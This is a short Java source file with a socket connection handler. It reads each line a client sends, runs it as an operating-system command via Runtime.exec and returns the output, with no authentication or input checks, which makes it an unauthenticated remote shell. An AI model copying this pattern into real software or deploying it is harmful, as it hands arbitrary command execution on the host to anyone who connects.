import java.io.*;
import java.net.*;
class Connection extends Thread {
	protected Socket client;
	protected DataInputStream in;
	protected PrintStream out;
	
	public Connection(Socket client_socket){
		client = client_socket;
		try {
			in = new DataInputStream(client.getInputStream());
			out = new PrintStream(client.getOutputStream());
		}
		catch (IOException e) {
			try  {client.close();} catch(IOException e2){}
			System.err.println("Exception while getting socket streams: " + e);
			return;
		}
		this.start();
	}
	public void run() {
		String line;
		StringBuffer revline;
		int len;
		Runtime rt = Runtime.getRuntime();
		try {
			for(;;){
				//System.out.println("getting a line\n");
				line=in.readLine();
				//System.out.println("got a line " + line +"\n");				
				if(line ==null)break;
				try {
				    Process prcs =rt.exec(line);
				    DataInputStream d = new DataInputStream(prcs.getInputStream());
				    String aline;
				    while((aline =d.readLine()) != null)
					out.println(aline);
				    aline = "     ";
				    out.println(aline);
				    }
				catch (IOException e) { ; }
			}
		}
		catch(IOException e){}
		finally {
            try { 
		//System.out.println("close on server end");
		client.close(); 
		}
	    catch (IOException e2) { ; }
        }

	}
}